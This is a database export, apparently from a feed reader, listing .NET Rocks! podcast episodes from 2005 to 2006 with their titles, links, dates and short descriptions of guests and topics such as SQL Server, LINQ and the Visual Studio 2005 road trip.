{"_id":719,"_uid":719,"_dt":1373728934271,"_s":"425a8d675496a2783341559c76b9ce07"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=173","title":"Kim Cameron on Digital Identity","published":{"$wrap":"$date","v":1145937600000,"h":"2006-04-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Kim Cameron about Identity and the challenges of tomorrow's authentication systems.","author":false,"_id":{"$wrap":"$oid","v":719}}
{"k":"0000000082","o":"0000000619","v":"001"}
{"_id":720,"_uid":720,"_dt":1373728934271,"_s":"08a8a9b86ee01172019d5414edc72186"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=172","title":"Bob Beauchemin on SQL Server 2005","published":{"$wrap":"$date","v":1145332800000,"h":"2006-04-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Bob Beauchemin talks about the new features in SQL Server 2005, and it's a lot more than just the .NET Framework!  Bob gets into some great details on the dos and don'ts of framework inside SQL Server, talks about the relative strengths and weaknesses of T-SQL, and addresses various issues and new features.","author":false,"_id":{"$wrap":"$oid","v":720}}
{"k":"0000000082","o":"0000000447","v":"001"}
{"_id":721,"_uid":721,"_dt":1373728934272,"_s":"1cf84029e9e4c68f238d02618dd35862"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=171","title":"Kathleen Dollard LIVE at Dev Connections Orlando 2006","published":{"$wrap":"$date","v":1144728000000,"h":"2006-04-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Kathleen Dollard, live at Dev Connections Orlando, 2006!  A great talk about the future of code generation and more.","author":false,"_id":{"$wrap":"$oid","v":721}}
{"k":"0000000082","o":"0000000398","v":"001"}
{"_id":722,"_uid":722,"_dt":1373728934273,"_s":"e049f5bbd4ba98e97008166039a28888"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=170","title":"Avalon, AJAX, Vista, and more with Tim Huckaby","published":{"$wrap":"$date","v":1144123200000,"h":"2006-04-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Tim Huckaby talks about developing for Avalon, AJAX, and Vista in general.","author":false,"_id":{"$wrap":"$oid","v":722}}
{"k":"0000000082","o":"0000000421","v":"001"}
{"_id":723,"_uid":723,"_dt":1373728934274,"_s":"8e6e827026661a9490d085415d402f0b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=169","title":"CSLA.NET 2.0 with Rocky Lhotka","published":{"$wrap":"$date","v":1143518400000,"h":"2006-03-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Rocky Lhotka discusses his CSLA.NET application framework version 2.0. New features, changes, and migration tips.","author":false,"_id":{"$wrap":"$oid","v":723}}
{"k":"0000000082","o":"0000000451","v":"001"}
{"_id":724,"_uid":724,"_dt":1373728934275,"_s":"dad1ad097689bb9382ac57d5bc83f018"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=168","title":"Test Driven Development with Jean Paul Boodhoo","published":{"$wrap":"$date","v":1142913600000,"h":"2006-03-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Get some deep insight into the tools and the techniques that make Test Driven Development an important new tool for developers.","author":false,"_id":{"$wrap":"$oid","v":724}}
{"k":"0000000082","o":"0000000524","v":"001"}
{"_id":725,"_uid":725,"_dt":1373728934275,"_s":"0cd277b867374a0598c412f0abaebb47"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=167","title":"Security Update with Patrick Hynds","published":{"$wrap":"$date","v":1142308800000,"h":"2006-03-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Pat Hynds checks in with us to talk ASP.NET security sharing his latest insights and telling stories from the field. As always, Pat brings his post-GI point of view to the conversation, which is always enjoyable.","author":false,"_id":{"$wrap":"$oid","v":725}}
{"k":"0000000082","o":"0000000477","v":"001"}
{"_id":726,"_uid":726,"_dt":1373728934276,"_s":"da22f901a1c59346c6da48009ee6bb33"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=166","title":"Joe Duffy on Concurrency","published":{"$wrap":"$date","v":1141685165000,"h":"2006-03-06T22:46:05.000Z"},"starred":false,"read":false,"content":"Carl and Richard have an engaging conversation with Joe Duffy from the CLR team on dealing with concurrency in multi-threaded applications. Buy his books! This is great stuff!","author":false,"_id":{"$wrap":"$oid","v":726}}
{"k":"0000000082","o":"0000000499","v":"001"}
{"_id":727,"_uid":727,"_dt":1373728934277,"_s":"f3f448567386b948f0def12bff2f4c5d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=165","title":"Nick Landry on the State of Mobile Development","published":{"$wrap":"$date","v":1141106867000,"h":"2006-02-28T06:07:47.000Z"},"starred":false,"read":false,"content":"Our old friend Nickolas Landry talks about the latest developments in mobile technology, both hardware and software, including Windows Mobile 5.0 and the Compact Framework 2.0","author":false,"_id":{"$wrap":"$oid","v":727}}
{"k":"0000000082","o":"0000000447","v":"001"}
{"_id":728,"_uid":728,"_dt":1373728934278,"_s":"3534194c76c4a3bcaa4dacc6919d5235"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=164","title":"Brian Noyes on Data Binding in .NET 2.0","published":{"$wrap":"$date","v":1140505967000,"h":"2006-02-21T07:12:47.000Z"},"starred":false,"read":false,"content":"Brian Noyes talks us through data binding in .NET 2.0 from the gee-whiz draggy droppy stuff to multi-tier enterprise applications.","author":false,"_id":{"$wrap":"$oid","v":728}}
{"k":"0000000082","o":"0000000435","v":"001"}
{"_id":729,"_uid":729,"_dt":1373728934278,"_s":"ecd3c07ef7031027bb546e5d9bc19b2e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=163","title":"LINQin with Barry Gervin","published":{"$wrap":"$date","v":1139889600000,"h":"2006-02-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Regional Director Barry Gervin introduces LINQ, a nascent set of language extentions providing query services for list-based objects.","author":false,"_id":{"$wrap":"$oid","v":729}}
{"k":"0000000082","o":"0000000480","v":"001"}
{"_id":730,"_uid":730,"_dt":1373728934279,"_s":"da6d4d05632bd52dbd2c85e7c6e787d1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=162","title":"Steven Forte on outsourcing and globalization","published":{"$wrap":"$date","v":1139284800000,"h":"2006-02-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Steven Forte shares his experiences with outsourcing and the different countries involved in software outsourcing. Of course, his stories are second to none.","author":false,"_id":{"$wrap":"$oid","v":730}}
{"k":"0000000082","o":"0000000512","v":"001"}
{"_id":731,"_uid":731,"_dt":1373728934283,"_s":"581ee94bc85a6f12026871d8091e3e75"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=161","title":"Mark Dunn takes us down the InfoPath","published":{"$wrap":"$date","v":1138680000000,"h":"2006-01-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Dunn joins Carl and Richard in the studio for another look at Infopath, framed for .NET developers. Mark, as you may remember, is the first co-host of .NET Rocks! and a good friend of the show.","author":false,"_id":{"$wrap":"$oid","v":731}}
{"k":"0000000082","o":"0000000693","v":"001"}
{"_id":732,"_uid":732,"_dt":1373728934284,"_s":"fb979c051ca0bde5a5c48bab15fd2595"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=160","title":"Cogan Rules","published":{"$wrap":"$date","v":1137988800000,"h":"2006-01-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Australian Regional Director Adam Cogan is known for his rules. In fact, if you work for his software company you can expect to get up every morning at 6AM for exercises. You'll also have to digest hundreds and hundreds of best practices and rules that he has compiled from his many years in the software business. In this show we point you to the rules, and even discuss a few of them. Not to be missed.","author":false,"_id":{"$wrap":"$oid","v":732}}
{"k":"0000000082","o":"0000000717","v":"001"}
{"_id":733,"_uid":733,"_dt":1373728934284,"_s":"4a84768868010e7b8202ea072be56f18"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=159","title":"Shawn Wildermuth on Decomposing ADO.NET","published":{"$wrap":"$date","v":1137297600000,"h":"2006-01-15T04:00:00.000Z"},"starred":false,"read":false,"content":"This week Carl Franklin and Richard Campbell interview Shawn Wildermuth about his experiences in the trenches with ADO.NET. He's down on datasources as a one-size-fits-all solution to data access. He talks about his upcoming book in which he attempts to organize projects into archetypes, and helps the reader determine which archetype thier project is closest to, so he can give his recommendations.","author":false,"_id":{"$wrap":"$oid","v":733}}
{"k":"0000000082","o":"0000000560","v":"001"}
{"_id":734,"_uid":734,"_dt":1373728934285,"_s":"6238e48f428e682719edd8d201bda78e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=158","title":"Chris Sells on Model-Driven Development","published":{"$wrap":"$date","v":1136692800000,"h":"2006-01-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Chris Sells rings in the new year by telling us about his current passion, Model-Driven Development (MDD) and associated concepts. Oh yeah, we also talk about big honkin' plasma TVs. Chris asks \"what should I get?\" Richard sets him straight.","author":false,"_id":{"$wrap":"$oid","v":734}}
{"k":"0000000082","o":"0000000561","v":"001"}
{"_id":735,"_uid":735,"_dt":1373728934286,"_s":"b45952d812b86e9c01209423d3a9bf64"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=157","title":"David Smith on BitTorrent and IPv6","published":{"$wrap":"$date","v":1134964800000,"h":"2005-12-19T04:00:00.000Z"},"starred":false,"read":false,"content":"David Smith talks to Richard and Carl about btSharp, his .NET implementation of the BitTorrent protocol written in C#. He also gives a great introduction to BitTorrent and how it works, and offers some insight on how IPv6 will make our lives easier.","author":false,"_id":{"$wrap":"$oid","v":735}}
{"k":"0000000082","o":"0000000423","v":"001"}
{"_id":736,"_uid":736,"_dt":1373728934287,"_s":"36e42e79bc2135394fa0ceab08c7260b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=156","title":"Andrew Brust on Business Intelligence and OLAP","published":{"$wrap":"$date","v":1134360000000,"h":"2005-12-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Andrew Brust talks to us about OLAP and BI, specifically about the new features of SQL Server 2005.","author":false,"_id":{"$wrap":"$oid","v":736}}
{"k":"0000000082","o":"0000000638","v":"001"}
{"_id":737,"_uid":737,"_dt":1373728934288,"_s":"a4fb3c1c528c22caac0caf52e83013cd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=155","title":"Deborah Kurata on Object Binding and More","published":{"$wrap":"$date","v":1133755200000,"h":"2005-12-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Deborah Kurata; star of stage, screen, and print; gives us the good, the bad, and the ugly about object binding, and covers other topics such as typed datasets, migration issues, and code generation. This is our first normal show since we've been back from our travels, and we have a few things to talk about ourselves.","author":false,"_id":{"$wrap":"$oid","v":737}}
{"k":"0000000082","o":"0000000992","v":"001"}
{"_id":738,"_uid":738,"_dt":1373728934289,"_s":"28955c6cc450c7e742ee9bc6eca2f3d5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=154","title":"From VBUG Across The Pond","published":{"$wrap":"$date","v":1133150400000,"h":"2005-11-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Only a week after returning from a 30-day trip through the interior of the American heartland, we found ourselves in Merry Old England speaking at and attending the VBUG Winter Conference. Carl moderated a Code-Off in which four developers each created a user interface for a system of web services, each using a different technology. They then showed off those applications in a very small window of time. Immediately following this, we interviewed them in front of the audience. We also spoke one-on-one to Graham Parker, one of the code-off developers, about VBUG and the UK .NET community.Note: The sound is a bit off during this show because we didn't have control over the audio. :-)","author":false,"_id":{"$wrap":"$oid","v":738}}
{"k":"0000000082","o":"0000000617","v":"001"}
{"_id":739,"_uid":739,"_dt":1373728934290,"_s":"015d746e8b8fad8c090db5fb64026686"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=153","title":"Mark Miller Wraps it Up","published":{"$wrap":"$date","v":1132545600000,"h":"2005-11-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Before we went on the road we spoke to Mark Miller about component-oriented architecture and other related topics. We wanted to finish what we started with Mark, and move on to Graphics programming, especially in the DXCore, a free component toolkit from Developer Express that CodeRush and Refactor use extensively.","author":false,"_id":{"$wrap":"$oid","v":739}}
{"k":"0000000082","o":"0000000457","v":"001"}
{"_id":740,"_uid":740,"_dt":1373728934291,"_s":"84d72a423215630bd6543f3e2a450abb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=152","title":"Road Trip San Francisco: The Launch!","published":{"$wrap":"$date","v":1132027200000,"h":"2005-11-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Well we finally got to San Francisco to the very first Visual Studio 2005 launch event. We walked around and found some old friends to talk to.","author":false,"_id":{"$wrap":"$oid","v":740}}
{"k":"0000000082","o":"0000000370","v":"001"}
{"_id":741,"_uid":741,"_dt":1373728934292,"_s":"9cbc8001678d649c1fcbdd48f9bbb9e5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=151","title":"Road Trip Los Angeles","published":{"$wrap":"$date","v":1131508800000,"h":"2005-11-09T04:00:00.000Z"},"starred":false,"read":false,"content":"The road trip is finishing up! This is the last show before the launch.","author":false,"_id":{"$wrap":"$oid","v":741}}
{"k":"0000000082","o":"0000000431","v":"001"}
{"_id":742,"_uid":742,"_dt":1373728934293,"_s":"91bd13eec3772de21f42356effac5f0e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=150","title":"Road Trip San Diego","published":{"$wrap":"$date","v":1131422400000,"h":"2005-11-08T04:00:00.000Z"},"starred":false,"read":false,"content":"San Diego is home to a handful of thriving .NET developer communities. We ran into some old friends there, and got some great stories.","author":false,"_id":{"$wrap":"$oid","v":742}}
{"k":"0000000082","o":"0000000435","v":"001"}
{"_id":743,"_uid":743,"_dt":1373728934294,"_s":"ecf349a6c3465f779a101a63bf7ffc7c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=149","title":"Road Trip Phoenix","published":{"$wrap":"$date","v":1131076800000,"h":"2005-11-04T04:00:00.000Z"},"starred":false,"read":false,"content":"We met up with Regional Director J. Michael Palermo and a cast of other characters in Phoenix, Arizona. It's hot, but .... well... you know.","author":false,"_id":{"$wrap":"$oid","v":743}}
{"k":"0000000082","o":"0000000470","v":"001"}
{"_id":744,"_uid":744,"_dt":1373728934295,"_s":"2b7ffcb264008c8abf1df08b2ed612a8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=148","title":"Road Trip Austin","published":{"$wrap":"$date","v":1130904000000,"h":"2005-11-02T04:00:00.000Z"},"starred":false,"read":false,"content":"We spent the weekend in Austin, Texas. Although it was a small crowd at the University, we got to speak to 8 developers including Jeff Palermo, Scott Bellware, and Mark Miller.","author":false,"_id":{"$wrap":"$oid","v":744}}
{"k":"0000000082","o":"0000000483","v":"001"}
{"_id":745,"_uid":745,"_dt":1373728934295,"_s":"18091ec3cda2a501759651ff682d1afd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=147","title":"Road Trip Houston","published":{"$wrap":"$date","v":1130731200000,"h":"2005-10-31T04:00:00.000Z"},"starred":false,"read":false,"content":"There was a big crowd at the Houston event. We had a great time talking to the locals after the show. Markus Egger showed up and managed to sit behind the microphone for a few minutes too.","author":false,"_id":{"$wrap":"$oid","v":745}}
{"k":"0000000082","o":"0000000540","v":"001"}
{"_id":746,"_uid":746,"_dt":1373728934296,"_s":"183ea44deb3ccb4235517e8a6ef92242"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=146","title":"Road Trip Dallas","published":{"$wrap":"$date","v":1130472000000,"h":"2005-10-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Dallas was great. For the second time in a row we didn't have to eat Pizza for dinner. One of the attendees told me (Carl) after the show that I had \"no fear\" to be able to get up in front of people and sing Clementine like... well... you know.","author":false,"_id":{"$wrap":"$oid","v":746}}
{"k":"0000000082","o":"0000000446","v":"001"}
{"_id":747,"_uid":747,"_dt":1373728934297,"_s":"6e79bc9d5634879955b61cc0d323c475"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=145","title":"Road Trip Memphis","published":{"$wrap":"$date","v":1130385600000,"h":"2005-10-27T04:00:00.000Z"},"starred":false,"read":false,"content":"In round 11 of the Road Trip, we got to have some real Memphis barbeque AND hang out with the one and only Jon Box. Does it get any better than this???","author":false,"_id":{"$wrap":"$oid","v":747}}
{"k":"0000000082","o":"0000000409","v":"001"}
{"_id":748,"_uid":748,"_dt":1373728934298,"_s":"81c02b0fff9f27a36641f9fe133673b4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=144","title":"Road Trip Nashville","published":{"$wrap":"$date","v":1130299200000,"h":"2005-10-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Nashville was a fun town. Never seen a crowd of geeks sing Clementine to Beethoven's 9th before. It was awesome.","author":false,"_id":{"$wrap":"$oid","v":748}}
{"k":"0000000082","o":"0000000394","v":"001"}
{"_id":749,"_uid":749,"_dt":1373728934299,"_s":"8d01e567d0323ab6c1e821d9eac924fd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=143","title":"Road Trip Atlanta","published":{"$wrap":"$date","v":1130212800000,"h":"2005-10-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Our longest road trip show yet! Mark Dunn, Rory Blyth, and a host of locals contribute to the show.","author":false,"_id":{"$wrap":"$oid","v":749}}
{"k":"0000000082","o":"0000000424","v":"001"}
{"_id":750,"_uid":750,"_dt":1373728934299,"_s":"03c042d347d556ff9c1ad8d935f29886"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=142","title":"Road Trip Raleigh","published":{"$wrap":"$date","v":1130126400000,"h":"2005-10-24T04:00:00.000Z"},"starred":false,"read":false,"content":"(Problem with incomplete files fixed)  This is a great episode of DNR, recorded at the road trip tour in Raleigh, North Carolina!","author":false,"_id":{"$wrap":"$oid","v":750}}
{"k":"0000000082","o":"0000000530","v":"001"}
{"_id":751,"_uid":751,"_dt":1373728934300,"_s":"3e03642c38d60854ec924d2e06770a94"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=141","title":"Road Trip Washington DC","published":{"$wrap":"$date","v":1129780800000,"h":"2005-10-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Our stop in Washington DC was great. We got to meet some old friends, fans new and old, and speak at the coveted Microsoft Technology Center in Reston, VA; which is as cool as - or cooler than - the Boston and New York locations.","author":false,"_id":{"$wrap":"$oid","v":751}}
{"k":"0000000082","o":"0000000378","v":"001"}
{"_id":752,"_uid":752,"_dt":1373728934301,"_s":"046ab00d58c3768b49577b761faac913"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=140","title":"Road Trip Baltimore","published":{"$wrap":"$date","v":1129694400000,"h":"2005-10-19T04:00:00.000Z"},"starred":false,"read":false,"content":"At the Baltimore event we got to talk to a wide variety of developers using .NET.","author":false,"_id":{"$wrap":"$oid","v":752}}
{"k":"0000000082","o":"0000000413","v":"001"}
{"_id":753,"_uid":753,"_dt":1373728934302,"_s":"1867f91947586d525e924d33b1fb75a3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=139","title":"Road Trip Philly","published":{"$wrap":"$date","v":1129608000000,"h":"2005-10-18T04:00:00.000Z"},"starred":false,"read":false,"content":"We were in Philadelphia, PA on Monday night, October 17th, speaking to a group organized by the Philly .NET User Group.","author":false,"_id":{"$wrap":"$oid","v":753}}
{"k":"0000000082","o":"0000000472","v":"001"}
{"_id":754,"_uid":754,"_dt":1373728934303,"_s":"33d403b81763f96fca538f270e5b9447"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=138","title":"Road Trip New Jersey","published":{"$wrap":"$date","v":1129435200000,"h":"2005-10-16T04:00:00.000Z"},"starred":false,"read":false,"content":"The Road Trip event in Edison New Jersey brought out DonXML, Miguel Castro, ScottW, and lots of other great speakers and members of the .NET community in the Edison, NJ area.","author":false,"_id":{"$wrap":"$oid","v":754}}
{"k":"0000000082","o":"0000000422","v":"001"}
{"_id":755,"_uid":755,"_dt":1373728934304,"_s":"908f14b623808f01e26d4cdad20b58d3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=137","title":"Road Trip New York","published":{"$wrap":"$date","v":1129348800000,"h":"2005-10-15T04:00:00.000Z"},"starred":false,"read":false,"content":"The New York City .NET Users Group hosted the Road Trip event at Microsoft in midtown Manhattan, and what a great time we had!","author":false,"_id":{"$wrap":"$oid","v":755}}
{"k":"0000000082","o":"0000000520","v":"001"}
{"_id":756,"_uid":756,"_dt":1373728934304,"_s":"b735f579065dd1689d52666458806d40"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=136","title":"Road Trip Hartford","published":{"$wrap":"$date","v":1129262400000,"h":"2005-10-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Now we're in full swing! We had a great event in Farmington, CT at the Connecticut .NET User Group, and got to talk to a handful of innovative members of the .NET community. I hope that all the road trip shows are this good!","author":false,"_id":{"$wrap":"$oid","v":756}}
{"k":"0000000082","o":"0000000515","v":"001"}
{"_id":757,"_uid":757,"_dt":1373728934305,"_s":"735e3bb9f03b02b50a272d3097130bac"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=135","title":"Road Trip Boston","published":{"$wrap":"$date","v":1129176000000,"h":"2005-10-13T04:00:00.000Z"},"starred":false,"read":false,"content":"It's not much, but it's our first podcast from the .NET Rocks! Visual Studio 2005 Road Trip event in Waltham, Massachusetts on the outskirts of Boston. We'll be trying to post a show every day of the month-long Road Trip.","author":false,"_id":{"$wrap":"$oid","v":757}}
{"k":"0000000082","o":"0000000458","v":"001"}
{"_id":758,"_uid":758,"_dt":1373728934306,"_s":"293a7712b07420afbdff16c4b0017737"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=134","title":"Mark Miller on Problem Solving","published":{"$wrap":"$date","v":1128916800000,"h":"2005-10-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Miller gets down and dirty with real tactics for solving problems and maximizing your efficiency as an architect and developer. Not to be missed.","author":false,"_id":{"$wrap":"$oid","v":758}}
{"k":"0000000082","o":"0000000609","v":"001"}
{"_id":759,"_uid":759,"_dt":1373728934307,"_s":"9ca6b58a4096532e7f2e4e31ad758b38"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=133","title":"Miguel Castro on Web Controls","published":{"$wrap":"$date","v":1128398400000,"h":"2005-10-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard run into Miguel Castro at a hotel bar at the MVP Summit 2005 in Bellevue, WA. This is the first real show we've done on Web Controls, and it has been a long time coming. There is so much technical information in this show you'll have to listen several times at possibly a slower speed.","author":false,"_id":{"$wrap":"$oid","v":759}}
{"k":"0000000082","o":"0000000652","v":"001"}
{"_id":760,"_uid":760,"_dt":1373728934308,"_s":"b2ddd7aece928a5d45b1d1a40a7c763c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=132","title":"Amanda Silver, Paul Vick, and Erik Meijer","published":{"$wrap":"$date","v":1127707200000,"h":"2005-09-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard interview three members of the Visual Basic team at PDC 2005. The conversation turns from favorite features of VB 2005 to LINQ to XML in VB.2005 to Orcas, best and worst moments on the VB team. We are also treated to a short after-dinner converation with Ted Pattison, George Bullock, Joe Hummel, and David Chappell.","author":false,"_id":{"$wrap":"$oid","v":760}}
{"k":"0000000082","o":"0000000626","v":"001"}
{"_id":761,"_uid":761,"_dt":1373728934310,"_s":"d894804ea04239f2e9355d522e74ef7a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=131","title":"Talking Tech with David Treadwell","published":{"$wrap":"$date","v":1127016000000,"h":"2005-09-18T04:00:00.000Z"},"starred":false,"read":false,"content":"In this episode, Carl and Richard get an hour with David Treadwell, VP of the .NET Framework Developer Division. David talks about his career at Microsoft from being the intern developer on Windows NT to his current role on the .NET Framework team, and offers his thoughts on the future of Windows and managed code.","author":false,"_id":{"$wrap":"$oid","v":761}}
{"k":"0000000082","o":"0000000471","v":"001"}
{"_id":762,"_uid":762,"_dt":1373728934311,"_s":"b2ad9213c488b4e3229ad8e47d2c0bd6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=130","title":"Jackie Goldstein Part 2 - ADO.NET","published":{"$wrap":"$date","v":1126324800000,"h":"2005-09-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Jackie Goldstein returns to talk about the ADO.NET, the data tools in Visual Studio .NET 2005, SQL 2005 Express and the starter kits he's been authoring for it.","author":false,"_id":{"$wrap":"$oid","v":762}}
{"k":"0000000082","o":"0000000577","v":"001"}
{"_id":763,"_uid":763,"_dt":1373728934311,"_s":"aa15a8373b121cd542a1edad7a5b9261"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=129","title":"Joel Semeniuk dives into Team System","published":{"$wrap":"$date","v":1125892800000,"h":"2005-09-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Joel Semeniuk gets us deeper into Visual Studio Team System by taking us step-by-step through the process of how it is used in the real world. Each designer is discussed in as much detail as an hour affords. For introductory information about VSTS, see show #117.","author":false,"_id":{"$wrap":"$oid","v":763}}
{"k":"0000000082","o":"0000000571","v":"001"}
{"_id":764,"_uid":764,"_dt":1373728934312,"_s":"934272e44feb45ef2644891f00fa5fc1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=128","title":"Michael Palermo Talks Code Snippets","published":{"$wrap":"$date","v":1125115200000,"h":"2005-08-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Regional Director J. Michael Palermo discusses his current passion, Code Snippets in VS 2005. You'll discover how this new feature compares to tools you may have already used, and you'll probably pick up a few productivity pointers along the way. Good stuff!","author":false,"_id":{"$wrap":"$oid","v":764}}
{"k":"0000000082","o":"0000000595","v":"001"}
{"_id":765,"_uid":765,"_dt":1373728934313,"_s":"d58b7cdf2a38e32cd9eee525c0099861"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=127","title":"Joel Pobar and Brad Abrams on the CLR","published":{"$wrap":"$date","v":1124683200000,"h":"2005-08-22T04:00:00.000Z"},"starred":false,"read":false,"content":"DNR goes back to its geek roots this week with a technical talk about the Common Language Runtime (CLR). Joel and Brad talk about what they would do differently knowing what they know now, how the CLR's memory managemnet strategy was formed, and their favorite features of CLR 2.0","author":false,"_id":{"$wrap":"$oid","v":765}}
{"k":"0000000082","o":"0000000615","v":"001"}
{"_id":766,"_uid":766,"_dt":1373728934314,"_s":"21e587d8cccf2d02d01da2987b18f878"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=126","title":"Rocky Lhotka discusses CSLA.NET","published":{"$wrap":"$date","v":1124078400000,"h":"2005-08-15T04:00:00.000Z"},"starred":false,"read":false,"content":"The listeners have asked for more technical content, and Rocky Lhotka delivers it!  In this episode, Rocky talks about CSLA.NET and the changes for VS2005.  He drills down into the details of some aspects of CSLA, and talks about his opinions on Service Oriented Architechture and Objects, and plenty more.","author":false,"_id":{"$wrap":"$oid","v":766}}
{"k":"0000000082","o":"0000000489","v":"001"}
{"_id":767,"_uid":767,"_dt":1373728934315,"_s":"7a265a7587e11fe66d78449bbe66dbc8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=125","title":"Jeffrey Palermo on ASP.NET","published":{"$wrap":"$date","v":1123473600000,"h":"2005-08-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Jeffrey talks about his experiences listening to .NET Rocks! while on duty with the Army Reserve in Iraq, and shares his ideas about architecture, ASP.NET, XHTML, CSS, and other things.","author":false,"_id":{"$wrap":"$oid","v":767}}
{"k":"0000000082","o":"0000000677","v":"001"}
{"_id":768,"_uid":768,"_dt":1373728934316,"_s":"06b10447b9cddb9e658c3b545b5ba889"}
